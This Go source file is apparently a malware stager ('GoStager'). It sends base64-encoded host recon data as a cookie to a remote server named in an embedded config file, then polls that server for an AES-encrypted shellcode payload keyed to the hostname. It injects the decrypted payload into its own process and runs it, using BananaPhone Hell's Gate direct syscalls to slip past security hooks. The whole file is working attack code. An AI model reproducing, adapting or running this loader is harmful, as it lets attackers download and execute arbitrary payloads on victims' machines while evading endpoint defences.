package main

import (
	"GoStager/util"
	_ "embed"
	b64 "encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

//go:embed conf.txt
var t string
var (
	body       []byte
	initChecks util.InitChecks
)

// example of using bananaphone to execute shellcode in the current thread.
// hell's gate

func main() {
	//get the shellcode by http
	conf := strings.Split(t, ",")
	//initial recon
	host := util.Recon()
	initChecks = util.UnmarshalJSON(host)
	cookie := b64.StdEncoding.EncodeToString(host)
	//initial request
	body = request(cookie, conf)
	//if the response is not a shellcode, sleep and try again
	for {
		if len(body) > 10 {
			break
		}
		t, _ := strconv.Atoi(string(body))
		sleep(t)
		body = request("", conf)
	}
	key := util.GenerateKey(initChecks.Hostname, 32)
	hexSc, _ := util.DecodeAES(body, []byte(key))
	shellcode, _ := hex.DecodeString(string(hexSc))
	//inject the shellcode
	inject(shellcode)
}

func sleep(t int) {
	time.Sleep(time.Duration(t) * time.Second)
}

func request(cookie string, conf []string) []byte {
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	req, _ := http.NewRequest("GET", conf[0], nil)
	req.Header.Add("User-Agent", conf[1])
	if cookie != "" {
		req.Header.Add("Cookie", cookie)
	}
	resp, _ := c.Do(req)
	body, _ = ioutil.ReadAll(resp.Body)
	fmt.Println(string(body))
	return body
}

func inject(shellcode []byte) {
	bp, _ := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	//resolve the functions and extract the syscalls
	alloc, _ := bp.GetSysID("NtAllocateVirtualMemory")
	protect, _ := bp.GetSysID("NtProtectVirtualMemory")
	createthread, _ := bp.GetSysID("NtCreateThreadEx")

	createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {

	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	bananaphone.Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	sleep(5)
	//write memory
	bananaphone.WriteMemory(shellcode, baseA)
	sleep(5)
	var oldprotect uintptr
	bananaphone.Syscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	sleep(5)
	var hhosthread uintptr
	bananaphone.Syscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	sleep(5)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
}
